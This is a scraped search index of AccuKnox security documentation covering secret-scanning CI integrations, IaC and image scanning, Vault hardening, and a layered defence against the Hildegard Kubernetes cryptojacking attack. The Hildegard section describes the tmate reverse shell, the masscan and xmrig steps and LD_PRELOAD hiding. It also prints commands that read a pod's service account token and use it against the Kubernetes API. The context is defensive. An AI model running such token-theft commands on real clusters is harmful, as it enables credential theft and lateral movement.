<p>Example: For a vulnerability with a high CVSS and EPSS score, if it's associated with a CWE from the Top 25 or KEV lists---such as CWE-79 (Cross-Site Scripting) or CWE-89 (SQL Injection)---it signals an urgent need for remediation.</p> <p>Integrating CWE classifications with CVSS and EPSS scores provides a robust, structured approach to vulnerability prioritization. CWEs add a layer of context, helping teams understand not just the severity and likelihood of exploitation, but also the nature and cause of vulnerabilities. By addressing these weaknesses at their root, security teams can improve application security, reduce the recurrence of issues, and ensure more efficient risk management.</p>"},{"location":"use-cases/forensics/","title":"Forensic Analysis of Security Events Using AccuKnox","text":"<p>Process forensics</p><p>Get granular details of all the executed processes within the target workloads.</p> <p>File forensics</p><p>Get granular details of all the accessed files within the target workloads.</p> <p>Network forensics</p><p>Get granular details of all the network accesses within the target workloads.</p> <p>Syscall forensics</p><p>Get granular details of all the security sensitive system calls within the target workloads.</p> <p>Sensitive Asset audit</p><p>Audit any (read/write) accesses to sensitive assets.</p>"},{"location":"use-cases/github-secret-scan/","title":"GitHub Actions: Integrating AccuKnox Secret Scanning","text":"<p>This guide explains how to integrate AccuKnox Secret Scanning into your GitHub Actions CI/CD workflow. The integration detects hardcoded secrets and sensitive data in your codebase, forwarding findings to the AccuKnox platform for centralized analysis and remediation.</p>"},{"location":"use-cases/github-secret-scan/#pre-requisites","title":"Pre-requisites","text":"<ul> <li> <p>GitHub repository with Actions enabled</p> </li> <li> <p>AccuKnox platform access</p> </li> </ul>"},{"location":"use-cases/github-secret-scan/#steps-for-integration","title":"Steps for Integration","text":""},{"location":"use-cases/github-secret-scan/#step-1-generate-accuknox-api-token","title":"Step 1: Generate AccuKnox API Token","text":"<p>Log in to AccuKnox. Navigate to Settings and select Tokens to create an AccuKnox token to forward scan results to SaaS. For details on generating tokens, refer to How to Create Tokens.</p>"},{"location":"use-cases/github-secret-scan/#step-2-configure-github-secrets","title":"Step 2: Configure GitHub Secrets","text":"<p>Define the following secrets in GitHub. For details on configuring the secrets/variables, refer to Using secrets in GitHub Actions.</p> <ul> <li> <p>ACCUKNOX_TOKEN: AccuKnox API token for authorization.</p> </li> <li> <p>ACCUKNOX_TENANT: Your AccuKnox tenant ID.F</p> </li> <li> <p>ACCUKNOX_ENDPOINT: The AccuKnox API URL (e.g., cspm.demo.accuknox.com).</p> </li> <li> <p>ACCUKNOX_LABEL: The label for your scan.</p> </li> </ul>"},{"location":"use-cases/github-secret-scan/#step-3-github-actions-workflow-setup","title":"Step 3: GitHub Actions Workflow Setup","text":"<p>Create or edit <code>.github/workflows/secret-scan.yml</code>:</p> <pre><code>name: AccuKnox Secret Scan Workflow\n\non:\n  push:\n    branches:\n      - secret\n\njobs:\n  tests:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@main\n\n      - name: AccuKnox Secret Scan TEST\n        uses: accuknox/secret-scan-action@v1.0.1\n        with:\n          token: ${{ secrets.ACCUKNOX_TOKEN }}\n          tenant_id: ${{ secrets.ACCUKNOX_TENANT }}\n          label: \"SPOC\"\n          endpoint: \"cspm.demo.accuknox.com\"\n          fail: true\n          use_extended_ruleset: false\n</code></pre>"},{"location":"use-cases/github-secret-scan/#inputs-for-accuknox-secret-scan-action","title":"Inputs for AccuKnox Secret Scan Action","text":"Input Name Description Optional/Required Default Value token The token for authenticating with the CSPM panel. Required None tenant_id The ID of the tenant. Required None label The label created in AccuKnox SaaS. Required None endpoint The URL of the CSPM panel to push the scan results to. Required <code>cspm.demo.accuknox.com</code> secret_scan_type Source type for scanning (<code>git</code>, <code>huggingface</code>, <code>s3</code>). Required <code>git</code> branch Branch to scan. Use branch name or <code>all-branches</code>. Optional <code>HEAD</code> branch exclude-paths Paths to exclude from the scan. Optional None args Additional arguments to pass to the CLI. Optional None dataset Dataset name (required if <code>secret_scan_type</code> is <code>huggingface</code>). Optional None huggingface_token Hugging Face token (required if <code>secret_scan_type</code> is <code>huggingface</code>). Optional None bucket_name S3 bucket name (required if <code>secret_scan_type</code> is <code>s3</code>). Optional None aws_access_key_id AWS Access Key ID (required if <code>secret_scan_type</code> is <code>s3</code>). Optional None aws_secret_access_key AWS Secret Access Key (required if <code>secret_scan_type</code> is <code>s3</code>). Optional None use_extended_ruleset Enable extended regex rules for detecting sensitive data. Optional <code>false</code> results Specifies which result types to output: <code>verified</code>, <code>unknown</code>, <code>unverified</code>, <code>filtered_unverified</code>. Defaults to all types. Optional <code>all</code> fail Fail the pipeline if secrets are found. Optional <code>false</code> upload_artifact Upload scan results as an artifact. Optional <code>true</code>"},{"location":"use-cases/github-secret-scan/#before-integration","title":"Before Integration","text":"<p>Without secret scanning in place, your GitHub workflow may unknowingly allow hardcoded credentials---like API keys or passwords---to be pushed to the repository, increasing the risk of sensitive data exposure</p>"},{"location":"use-cases/github-secret-scan/#after-integration","title":"After Integration","text":"<p>AccuKnox Secret Scanning will run on every push, detecting hard-coded secrets and sensitive information. The findings are sent to AccuKnox for review and remediation. Only the scan results are uploaded, not the sensitive data.</p> <p></p>"},{"location":"use-cases/github-secret-scan/#view-results-in-accuknox-saas","title":"View Results in AccuKnox SaaS","text":"<p>Step 1: Navigate to the Accuknox SaaS dashboard after the pipeline completes.</p> <p>Step 2: Go to Issues &gt; Findings and select Secret Scan Findings to see identified vulnerabilities.</p> <p></p>"},{"location":"use-cases/github-secret-scan/#step-3-review-detected-secrets","title":"Step 3: Review Detected Secrets","text":"<p>Examine the list of identified hardcoded secrets and sensitive information.</p> <p></p>"},{"location":"use-cases/github-secret-scan/#step-4-address-findings","title":"Step 4: Address Findings","text":"<p>For each finding, create a task in your issue-tracking system, advising secret rotation and the use of a secure secret management solution. Once resolved, mark the issue as fixed in the AccuKnox platform.</p> <p></p>"},{"location":"use-cases/github-secret-scan/#conclusion","title":"Conclusion","text":"<p>Integrating AccuKnox Secret Scanning in GitHub Actions provides an automated layer of security to identify and resolve exposed secrets early in the dev lifecycle, reducing risk and improving compliance posture.</p>"},{"location":"use-cases/gitlab-secret-scan/","title":"Gitlab Secret Scan","text":"<p>This guide walks you through integrating AccuKnox Secret Scanning into your GitLab CI/CD pipeline to improve code security. The integration helps identify hard-coded secrets and sensitive data in your repositories, with scan results uploaded to the AccuKnox SaaS platform for analysis and remediation.</p>"},{"location":"use-cases/gitlab-secret-scan/#pre-requisites","title":"Pre-requisites","text":"<ul> <li> <p>GitLab Access</p> </li> <li> <p>AccuKnox Platform Access</p> </li> </ul>"},{"location":"use-cases/gitlab-secret-scan/#steps-for-integration","title":"Steps for Integration","text":"<p>Step 1: Log in to AccuKnox Navigate to Settings and select Tokens to create an AccuKnox token for forwarding scan results to SaaS. For details on generating tokens, refer to How to Create Tokens.</p> <p>Step 2: Configure GitLab CI/CD Variables. For details on configuring variables, refer to How to Create CI/CD Variables in GitLab.</p> <ol> <li> <p>ACCUKNOX_TOKEN: AccuKnox API token for authorization.</p> </li> <li> <p>ACCUKNOX_TENANT: Your AccuKnox tenant ID.</p> </li> <li> <p>ACCUKNOX_ENDPOINT: The AccuKnox API URL (e.g., cspm.demo.accuknox.com).</p> </li> <li> <p>ACCUKNOX_LABEL: The label for your scan.</p> </li> </ol> <p>Step 3: Set Up GitLab CI/CD Pipeline</p> <p>Create a new pipeline in your GitLab project with the following YAML configuration:</p> <pre><code>include:\n  - component: $CI_SERVER_FQDN/accu-knox/scan/secret-scan@main\n    inputs:\n      STAGE: test\n      INPUT_SOFT_FAIL: false\n      ACCUKNOX_TOKEN: ${ACCUKNOX_TOKEN}\n      ACCUKNOX_TENANT: ${ACCUKNOX_TENANT}\n      ACCUKNOX_ENDPOINT: ${ACCUKNOX_ENDPOINT}\n      ACCUKNOX_LABEL: ${ACCUKNOX_LABEL}\n</code></pre>"},{"location":"use-cases/gitlab-secret-scan/#impact-of-accuknox-secret-scanning-integration","title":"Impact of AccuKnox Secret Scanning Integration","text":""},{"location":"use-cases/gitlab-secret-scan/#before-integration","title":"Before Integration","text":"<p>Your pipeline might not perform secret scanning, potentially exposing sensitive data in your code.</p>"},{"location":"use-cases/gitlab-secret-scan/#after-integration","title":"After Integration","text":"<p>AccuKnox Secret Scanning will run on every push, detecting hard-coded secrets and sensitive information. The findings are sent to AccuKnox for review and remediation. Only the scan results are uploaded, not the sensitive data.</p> <p></p>"},{"location":"use-cases/gitlab-secret-scan/#view-results-in-accuknox-saas","title":"View Results in AccuKnox SaaS","text":"<p>Step 1: Navigate to the Accuknox SaaS dashboard after the pipeline completes.</p> <p>Step 2: Go to Issues &gt; Findings and select Secret Scan Findings to see identified vulnerabilities.</p> <p></p>"},{"location":"use-cases/gitlab-secret-scan/#step-3-review-detected-secrets","title":"Step 3: Review Detected Secrets","text":"<p>Examine the list of identified hardcoded secrets and sensitive information.</p> <p></p>"},{"location":"use-cases/gitlab-secret-scan/#step-4-address-findings","title":"Step 4: Address Findings","text":"<p>For each finding, create a task in your issue-tracking system, advising secret rotation and the use of a secure secret management solution. Once resolved, mark the issue as fixed in the AccuKnox platform.</p> <p></p>"},{"location":"use-cases/gitlab-secret-scan/#conclusion","title":"Conclusion","text":"<p>Integrating AccuKnox Secret Scanning into your GitLab CI/CD pipeline ensures a proactive security measure against hardcoded secrets. This helps mitigate risks early in development and guarantees that sensitive information is properly protected, enhancing the overall security of your codebase.</p>"},{"location":"use-cases/hardening/","title":"Comprehensive Guide to Hardening Workloads with AccuKnox","text":"<p>Service Account token</p><p>Protect access to k8s service account token</p> <p>FIM</p><p>File Integrity Monitoring</p> <p>Packaging tools</p><p>Deny execution of package management tools</p> <p>Trusted certs bundle</p><p>Protect write access to the trusted root certificates bundle</p> <p>Database access</p><p>Protect read/write access to raw database tables from unknown processes.</p> <p>Config data</p><p>Protect access to configuration data containing plain text credentials.</p> <p>File Copy</p><p>Prevent file copy using standard utilities.</p> <p>Network Access</p><p>Prevent network access to any processes or selectively enable network access to specific processes.</p> <p>/tmp/ noexec</p><p>Do not allow execution of binaries from /tmp/ folder.</p> <p>Admin tools</p><p>Do not allow execution of administrative/maintenance tools inside the pods.</p> <p>Discovery tools</p><p>Do not allow discovery/search of tools/configuration.</p> <p>Logs delete</p><p>Do not allow external tooling to delete logs/traces of critical components.</p> <p>ICMP control</p><p>Do not allow scanning tools to use ICMP for scanning the network.</p> <p>Restrict Capabilities</p><p>Do not allow capabilities that can be leveraged by the attacker.</p>"},{"location":"use-cases/hashicorp/","title":"HashiCorp Vault Hardening","text":"<p>HashiCorp Vault helps organizations reduce the risk of breaches and data exposure with identity-based security automation and encryption as a service. When HashiCorp Vault is deployed in the Kubernetes cluster, Customer secrets are kept in a persistent volume mounted in a vault-* stateful sets/pods</p> <p>Usually on /bin/vault accesses this volume mount points to get the secrets stored. If any ransomware attacker gets access to these volume mount points then the secrets can be accessed by them.</p> <p></p> <p>Ransomware Attacks on HashiCorp Vault:</p> <p>If any ransomware attacker tries to compromise the security of the pod and gets access to the vault pod, they can do a command injection and encrypt the secrets stored in the Volume mount points. Then the organizations have to pay millions of dollars to get back their secrets decrypted. This will be a major challenge that organizations want to protect.</p> <p></p> <p>KubeArmor Protection:</p> <p>AccuKnox CNCF sandbox open-source project KubeArmor can prevent this type of attack even before it happens. KubeArmor uses the eBPF for observability and LSMs Like AppArmor, SELinux, and BPF-LSM for policy enforcement. Using the eBPF, KubeArmor monitors the workload default Security Posture and also gets the file, process, and network access that are happening in the pod.</p> <p></p> <p>Based on the default Security Posture of the workload, policies will be auto-generated with the help of Compliance frameworks like MITRE, NIST, CIS and PCI DSS. Using KubeArmor we can apply policies to restrict malicious activities like remote code execution and command injection at the time of the attack. KubeArmor gives inline remediation so that attack is prevented at the runtime as and when it happens.</p> <p>Steps to prevent the attack:</p> <p>Once the Kubernetes cluster with Vault application installed is onboarded into the AccuKnox SaaS. We can see the Application Behaviour by clicking the View Application Behaviour option from the Vault pod.</p> <p></p> <p>Application Behaviour of Vault pod:</p> <p>Graphical View:</p> <p>Using this Graphical view we can get details about the ingress and egress network connections that are present in the pod.</p> <p></p> <p>List view:</p> <p>The list view will be giving details regarding</p> <ul> <li>File Observability: Files that are accessed in the Vault pod</li> </ul> <p></p> <ul> <li>Process Observability:Process that are running in the vault pod   </li> </ul> <p>We can protect the vault application using KubeArmor with the help of the following policy</p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: ksp-vault-protect\n  namespace: default\nspec:\n  severity: 7\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: vault\n      component: server\n  file:\n    matchDirectories:\n      - dir: /vault/\n        recursive: true\n        action: Block\n      - dir: /\n        recursive: true\n      - dir: /vault/\n        recursive: true\n        fromSource:\n          - path: /bin/vault\n  process:\n    matchPaths:\n    - path: /bin/busybox\n    - path: /bin/vault\n  action: Allow\n</code></pre> <p>The above KubeArmor policy</p> <ul> <li> <p>Allows only /bin/vault process to access /vault/ folder.</p> </li> <li> <p>Allows execution of specific processes like</p> </li> <li> <p>/bin/vault</p> </li> <li> <p>/bin/vault-tool</p> </li> </ul> <p>Before Applying policy:</p> <p>Before Applying the kubeArmor Policy any ransomware attacker who gains access to the shell or bash of the Vault can able to access the vault folder to get secret details.</p> <p></p> <p>Applying the KubeArmorPolicy:</p> <p>Step 1: To create the policy Navigate to Runtime Protection\u2192Policies. Then select Create Policy option from the screen.</p> <p></p> <p>Step 2: In the policy, editor tool create the above policy and Select Save to workspace option.</p> <p></p> <p>Step 3: When we apply the policy, it goes into the pending state for approval.</p> <p></p> <p>Step 4: Review the changes and approve the policy</p> <p></p> <p>Step 5: After Approval policy becomes active</p> <p></p> <p>Step 6: Now if you try to access the vault folder using the shell or bash of the vault pod, the access will be denied as the KubeArmor policy deny the permission.</p> <p></p> <p>Step 7: We can view the log alerts by navigating to the Monitors/Logging\u2192 logs</p> <p></p> <p>This will save the Volume mount of the HashiCorp Vault to be accessed by any attacker and also it prevents the vault application from remote code execution via AccuKnox's inline remediation.</p> <p>SCHEDULE DEMO</p>"},{"location":"use-cases/hildegard/","title":"Detecting and Mitigating Hildegard Attacks with AccuKnox","text":""},{"location":"use-cases/hildegard/#introduction","title":"Introduction","text":"<p>In a Kubernetes cluster, several attack vectors become possible through the combination of multiple vulnerabilities in the environment. These become the basis for the Hildegard attack to succeed:</p> <ul> <li> <p>Vulnerabilities in Container Image</p> </li> <li> <p>Malicious Container images pushed to registry which gets deployed on hosts</p> </li> <li> <p>Cryptomining [Ref]</p> </li> <li> <p>Embedded Secrets</p> </li> <li> <p>SSH Keys, AWS Credentials, Github Tokens, NPM tokens, etc.</p> </li> <li> <p>Proxy Avoidance, and many more..</p> </li> <li> <p>Difficulty of implementing Runtime Security</p> </li> <li> <p>Rogue container reconnaissance</p> </li> <li> <p>Malicious RCE at runtime or Unknown process exec</p> </li> <li> <p>Lateral Movement (writable volume mount points on hosts, service account exploitation, etc.)</p> </li> <li> <p>Credential Theft (exposure of service account token, credential in config files, write into volume mount point)</p> </li> <li> <p>Execution (maliciousexec into containers, malicious container spin-up, etc.)</p> </li> <li> <p>Modern attack vectors are complex and could target Linux Kernel Exploits</p> </li> <li> <p>[Resource Hijacking] [T1496] for cryptocurrency attacks</p> </li> <li> <p>Spaghetti of Access Controls</p> </li> <li> <p>Privilege Escalation via unused service account token, write to root certificate bundles etc.</p> </li> </ul>"},{"location":"use-cases/hildegard/#exploit","title":"Exploit","text":"<ol> <li>The attacker started by exploiting an unsecured Kubelet on the internet and searched for containers running inside the Kubernetes nodes. After finding container 1 in Node A, the attacker attempted to perform remote code execution (RCE) in container 1.</li> <li>The attacker downloaded tmate and issued a command to run it and establish a reverse shell to tmate \u2022 Instant terminal sharing from container 1. The attacker then continued the attack with this tmate session.</li> <li>From container 1, the attacker used masscan to scan Kubernetes's internal network and found unsecured Kubelets in Node B and Node C. The attacker then attempted to deploy a malicious crypto mining script (xmr.sh) to containers managed by these Kubelets (containers 2-7).</li> <li>Containers that ran xmr.sh started an xmrig process and established an IRC channel back to the IRC C2.</li> <li>The attacker could also create another tmate session from one of the containers (container 4). With the reverse shell, the attacker could perform more manual reconnaissance and operations.</li> </ol>"},{"location":"use-cases/hildegard/#protection","title":"Protection","text":"<p>Let us see how AccuKnox offers multiple layers of protection against this attack:</p>"},{"location":"use-cases/hildegard/#layer-1","title":"Layer 1","text":"<p>The attacker gains access to the misconfigured kubelet that has anonymous access enabled. Then he makes API calls using the service account token present in the container.</p> <pre><code># cat /run/secrets/kubernetes.io/serviceaccount/token\n# curl https://$KUBERNETES_PORT_443_TCP_ADDR/api --insecure --header \\\n \"Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)\"\n</code></pre> <p>To prevent this, AccuKnox can restrict access to the service account tokens to only the processes that require them using the below policy:</p> <pre><code>apiVersion: security.accuknox.com/v1\nkind: KubeArmorPolicy\nmetadata:\n name: ksp-wordpress-sa-block\n namespace: wordpress-mysql\nspec:\n severity: 7\n selector:\n matchLabels:\n app: wordpress\n file:\n matchDirectories:\n - dir: /run/secrets/kubernetes.io/serviceaccount/\n recursive: true\n action:\n Block\n</code></pre> <p>The above policy makes sure that no process is allowed access to the serviceaccount as this wordpress container does not require it at runtime. Hence, we can make use of this policy to prevent anyone from gaining access to it.</p>"},{"location":"use-cases/hildegard/#layer-2","title":"Layer 2","text":"<p>The attacker downloaded <code>tmate</code> and issued a command to run it, for securing a reverse shell.</p> <p>This can be completely prevented by using a whitelisting policy that allows only the necessary processes to make use of network protocols such as the following:</p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: restrict-proccess\n  namespace: default\nspec:\n  severity: 4\n  selector:\n    matchLabels:\n      app: nginx\n  network:\n    matchProtocols:\n    - protocol: tcp\n      fromSource:\n      - path: /usr/bin/wget\n    - protocol: udp\n      fromSource:\n      - path: /usr/bin/wget\n  action:\n    Allow\n</code></pre> <p>The above policy will only allow <code>wget</code> to make use of the TCP and UDP network protocols. <code>tmate</code> will thus be denied access to use TCP and UDP.</p> <p>A similar policy can be created for any container, listing only the allowed binaries. The creation of these policies is automated using AccuKnox SaaS via Discover Engine.</p>"},{"location":"use-cases/hildegard/#layer-3","title":"Layer 3","text":"<p>After identifying the target, the attacker executes the malicious binaries using a known Linux process name(bioset) to avoid detection.</p> <p>A FIM policy can be used by AccuKnox to make sure the binary files do not get modified.</p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: harden-mysql-file-integrity-monitoring\n  namespace: wordpress-mysql\nspec:\n  action: Block\n  file:\n    matchDirectories:\n    - dir: /sbin/\n      readOnly: true\n      recursive: true\n    - dir: /usr/bin/\n      readOnly: true\n      recursive: true\n    - dir: /usr/lib/\n      readOnly: true\n      recursive: true\n    - dir: /usr/sbin/\n      readOnly: true\n      recursive: true\n    - dir: /bin/\n      readOnly: true\n      recursive: true\n    - dir: /boot/\n      readOnly: true\n      recursive: true\n  message: Detected and prevented compromise to File integrity\n  selector:\n    matchLabels:\n      app: mysql\n  severity: 1\n  tags:\n  - NIST\n  - NIST_800-53_AU-2\n  - NIST_800-53_SI-4\n  - MITRE\n  - MITRE_T1036_masquerading\n  - MITRE_T1565_data_manipulation\n</code></pre> <p>The above policy denies all write access inside the <code>/bin/</code>, <code>/sbin/</code> and <code>/boot/</code> directories to prevent the attacker from tampering with the processes.</p>"},{"location":"use-cases/hildegard/#layer-4","title":"Layer 4","text":"<p>After successfully running <code>tmate</code>, <code>xmrig</code>, and <code>ziggy</code>, the attacker hides them using <code>LD_PRELOAD</code>. In particular, the malware overwrites two functions: <code>readdir()</code> and <code>readdir64()</code>, which are responsible for returning the directory entries in the file system. This blinds most of the observability tools and container monitoring solutions.</p> <p>KubeArmor taps the process execution in kernel space and will still be able to identify these processes even after the <code>/etc/ld.so.preload</code> file is modified to hide them.</p>"},{"location":"use-cases/hildegard/#layer-5","title":"Layer 5","text":"<p>Hildegard encrypts the malicious payload for IRC (ziggystartux ELF) to avoid being detected by automated static analysis tools. The ziggystartux ELF is encrypted and packed in another binary (ziggy). When the binary is executed, the ziggystartux ELF is decrypted by a hardcoded Advanced Encryption Standard (AES) key and executed in memory.</p> <p>AccuKnox can whitelist only the required processes in a container. A sample policy that can be used:</p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: allow-specific-process\n  namespace: default\nspec:\n  action: Allow\n  file:\n    matchDirectories:\n      - dir: /\n        recursive: true\n  process:\n    matchPaths:\n      - path: /bin/bash\n      - fromSource:\n          - path: /bin/dash\n        path: /bin/ping\n      - fromSource:\n          - path: /usr/sbin/apache2\n        path: /bin/sh\n      - path: /usr/sbin/apache2\n  selector:\n    matchLabels:\n      app: dvwa-web\n      tier: frontend\n  severity: 1\n</code></pre> <p>The above policy only allows a few processes to be executed - <code>ping</code> and <code>apache2</code> other than the shells. Everything else gets denied, making sure that the payload will still get blocked from execution. These policies are auto-generated on the AccuKnox SaaS platform making it much easier to identify the required processes.</p>"},{"location":"use-cases/hildegard/#key-points","title":"Key points","text":"<ul> <li> <p>Initial Access: Misconfigured kubelet allows anonymous access</p> </li> <li> <p>Malware attempted to spread over as many containers as possible using service account tokens(Kubelet API) and eventually launched cryptojacking operations.</p> </li> <li> <p>Service account token access is strictly controlled.</p> </li> <li> <p>Allow only specific processes to access the service account token.</p> </li> <li> <p>Two C&amp;C conns: Reverse <code>tmate</code> shell and IRC channel</p> </li> <li> <p>Network access is allowed for known binaries only</p> </li> <li> <p>Uses a known Linux process name (bioset) to disguise the malicious process.</p> </li> <li> <p>FIM disallows modifications in systems binary folder</p> </li> <li> <p><code>LD_PRELOAD</code> to hide the malicious processes.</p> </li> <li> <p>Process execution is tapped in kernel space</p> </li> <li> <p>Encrypts the malicious payload inside a binary to make automated static analysis more difficult</p> </li> <li> <p>Process whitelisting and binary tracking audits all the events.</p> </li> </ul>"},{"location":"use-cases/hildegard/#summary","title":"Summary","text":"<p>Hildegard takes advantage of the different vulnerabilities caused by non-conformance with the best practices and understanding the loopholes behind the monitoring and security practices that are followed.</p> <p>AccuKnox acts as an additional layer of protection helping protect against exploitation of these vulnerabilities. Operating at the kernel level also allows AccuKnox to cover the blindspots of the traditional solutions and provide a complete and layered security against the Hildegard attack.</p>"},{"location":"use-cases/iac-scan/","title":"Integrating AccuKnox IaC Scanning for AWS S3 Buckets in Your CI/CD Pipeline","text":"<p>This guide demonstrates how to integrate AccuKnox's IaC Scanner into a CI/CD pipeline to automatically detect and fix misconfigurations in Terraform projects.</p> <p>\ud83d\udd17 Check it out on GitHub Marketplace: AccuKnox IaC Scanner</p>"},{"location":"use-cases/iac-scan/#scenario","title":"Scenario","text":"<p>You manage AWS infrastructure using Terraform, including an S3 bucket for website hosting. Your GitHub Actions CI/CD pipeline automatically deploys changes. To enforce security best practices, you want to scan Terraform configurations before deployment.</p>"},{"location":"use-cases/iac-scan/#objective","title":"Objective","text":"<p>Integrate AccuKnox IaC Scanner into your CI/CD pipeline to identify and fix potential security misconfigurations, focusing on AWS S3 bucket security.</p>"},{"location":"use-cases/iac-scan/#tools","title":"Tools","text":"<ul> <li> <p>AccuKnox -- CNAPP platform</p> </li> <li> <p>GitHub Actions -- CI/CD platform (similar process for GitLab CI, Jenkins, etc.)</p> </li> </ul>"},{"location":"use-cases/iac-scan/#steps","title":"Steps","text":""},{"location":"use-cases/iac-scan/#1-terraform-setup","title":"1. Terraform Setup","text":"<p>Example Terraform code for creating an S3 bucket:</p> <pre><code>resource \"aws_s3_bucket\" \"my_bucket\" {\n  bucket = \"my-unique-bucket-name\"\n  acl    = \"public-read\"\n\n  website {\n    index_document = \"index.html\"\n    error_document = \"error.html\"\n  }\n}\n</code></pre>"},{"location":"use-cases/iac-scan/#2-github-actions-workflow-integration","title":"2. GitHub Actions Workflow Integration","text":"<p>Create a GitHub Actions workflow at <code>.github/workflows/iac.yml</code>:</p> <pre><code>name: AccuKnox IaC Scan Workflow\n\non:\n  push:\n    branches:\n      - iac\n\njobs:\n  tests:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@main\n\n      - name: Accuknox IaC\n        uses: accuknox/iac-scan-action@v0.0.1\n        with:\n          directory: ./\n          output_file_path: ./results\n          token: ${{ secrets.ACCUKNOX_TOKEN }}\n          endpoint: ${{ secrets.ACCUKNOX_ENDPOINT }}\n          tenant_id: ${{ secrets.ACCUKNOX_TENANT_ID }}\n          label: ${{ secrets.ACCUKNOX_LABEL }}\n          quiet: \"true\"\n          soft_fail: true\n</code></pre>"},{"location":"use-cases/iac-scan/#3-before-integration","title":"3. Before Integration","text":"<p>Without the AccuKnox scan, insecure configurations like <code>acl = \"public-read\"</code> could be deployed without any warnings.</p>"},{"location":"use-cases/iac-scan/#4-after-integration","title":"4. After Integration","text":"<p>Once AccuKnox is integrated:</p> <ul> <li> <p>Every push or pull request triggers a security scan.</p> </li> <li> <p>Misconfigurations (e.g., public-read S3 buckets) are identified.</p> </li> <li> <p>Results are available under Actions \u2192 Run IaC scan in GitHub.</p> </li> </ul> <p>You can view:</p> <ul> <li> <p>Which security checks passed or failed</p> </li> <li> <p>Detailed results are directly in the GitHub Action logs.</p> </li> </ul> <p></p>"},{"location":"use-cases/iac-scan/#5-viewing-findings-on-accuknox-saas","title":"5. Viewing Findings on AccuKnox SaaS","text":"<ul> <li> <p>Log in to the AccuKnox SaaS platform.</p> </li> <li> <p>Navigate to Issues \u2192 Findings.</p> </li> <li> <p>Filter by Data Type: IaC Scan.</p> </li> </ul> <p></p> <ul> <li> <p>Search for your repository or specific findings.</p> </li> <li> <p>Click on a finding for detailed information, remediation steps, and solutions.</p> </li> </ul> <p></p> <p></p>"},{"location":"use-cases/iac-scan/#6-remediating-issues","title":"6. Remediating Issues","text":""},{"location":"use-cases/iac-scan/#61-create-a-ticket","title":"6.1 Create a Ticket","text":"<ul> <li> <p>You can create a ticket directly from AccuKnox Findings by integrating your organization's ticketing system (Jira, ServiceNow, etc.) with AccuKnox.</p> </li> <li> <p>This ensures vulnerabilities detected during scans are automatically or manually ticketed for tracking and resolution.</p> </li> <li> <p>Refer to the integration guide for setup:   \ud83d\udd17 AccuKnox Jira Cloud Integration Guide</p> </li> </ul> <p></p>"},{"location":"use-cases/iac-scan/#62-fix-the-code","title":"6.2 Fix the Code","text":"<ul> <li> <p>After fixing the vulnerability, rerun the pipeline.</p> </li> <li> <p>Navigate to the AccuKnox dashboard and verify that the vulnerability has been resolved.</p> </li> </ul>"},{"location":"use-cases/iac-scan/#conclusion","title":"Conclusion","text":"<p>Integrating AccuKnox IaC Scans into your CI/CD pipeline helps:</p> <ul> <li> <p>Catch misconfigurations early.</p> </li> <li> <p>Maintain security best practices.</p> </li> <li> <p>Ensure a faster, safer deployment process.</p> </li> </ul>"},{"location":"use-cases/image-scan/","title":"Container Image Scanning","text":"<p>Need for securing containers for Application Hardening</p> <p>With advent of digital transformation, there has been a significant increase in container adoption in production environments which is making containers an easy target for exploitation. Since the Pod is the smallest execution unit in Kubernetes and its usually unsecure which means once you do a exec in a Pod, you can access all sensitive paths, files or execute a binary. And therefore even a single vulnerable or compromised container could potentially become a point of entry into an organization's broader environment.</p> <p>AccuKnox can secure containers by scanning container images, monitoring code in repositories and registries and evaluating it against security best practices using auto-recommended hardening policies as a part of continuous integration and continuous delivery workflows. We can secure both managed and unmanaged cluster, public and private cloud hosted workloads as well.</p> <p>Lets understand this by an example use-case - Container Image scanning</p> <ul> <li>User can add docker hub, ECR registries by navigating to Issues\u2192Registryscan. In the screen click Add Registry option</li> </ul> <p></p> <ul> <li> <p>If you have an existing registry give the necessary details of your registry to scan. For step by step onboarding instructions, refer:</p> <ul> <li>ECR onboarding</li> <li>GAR onboarding</li> <li>ACR onboarding</li> </ul> </li> </ul> <p></p> <ul> <li>Once the registry is added successfully, the scan will automatically start and user can navigate to the Issues\u2192Registry scan option to see the findings</li> </ul> <p></p> <p>SCHEDULE DEMO</p>"},{"location":"use-cases/iot-edge-security/","title":"IoT and Edge Security","text":"<p>Learn how KubeArmor can be leveraged to provide security for the IoT/Edge workloads at open horizon.io</p>"},{"location":"use-cases/jenkins-secret-scan/","title":"Jenkins Secret Scanning Integration","text":""},{"location":"use-cases/jenkins-secret-scan/#overview","title":"Overview","text":"<p>The AccuKnox Secret Scanning Jenkins Plugin simplifies integrating secret scanning into Jenkins pipelines. This plugin uses TruffleHog to detect sensitive data such as API keys, tokens, and secrets in the source code. The detected secrets are then uploaded to AccuKnox SaaS for centralized visibility and management.</p>"},{"location":"use-cases/jenkins-secret-scan/#key-features","title":"Key Features","text":"<ol> <li> <p>Secret Detection with TruffleHog: Scan repositories for sensitive information using TruffleHog.</p> </li> <li> <p>Results Upload: Seamlessly upload scan results to AccuKnox SaaS for centralized monitoring.</p> </li> <li> <p>Customizable Parameters: Configure scanning options, including excluded paths, branch selection, and additional TruffleHog arguments.</p> </li> </ol>"},{"location":"use-cases/jenkins-secret-scan/#installation","title":"Installation","text":""},{"location":"use-cases/jenkins-secret-scan/#current-installation-method","title":"Current Installation Method","text":"<ol> <li> <p>Download the Plugin:</p> </li> <li> <p>Download the <code>.hpi</code> file for the plugin from your internal repository or the provided location.</p> </li> <li> <p>Install the Plugin:</p> </li> <li> <p>Navigate to the Jenkins Dashboard.</p> </li> <li> <p>Go to Manage Jenkins &gt; Manage Plugins.</p> </li> </ol> <p></p> <ul> <li>Select the Advanced tab and upload the <code>.hpi</code> file using the Choose File option.</li> </ul> <p></p> <p></p> <ul> <li>Click Deploy to install the plugin.</li> </ul> <p></p> <ul> <li>Restart Jenkins if prompted.</li> 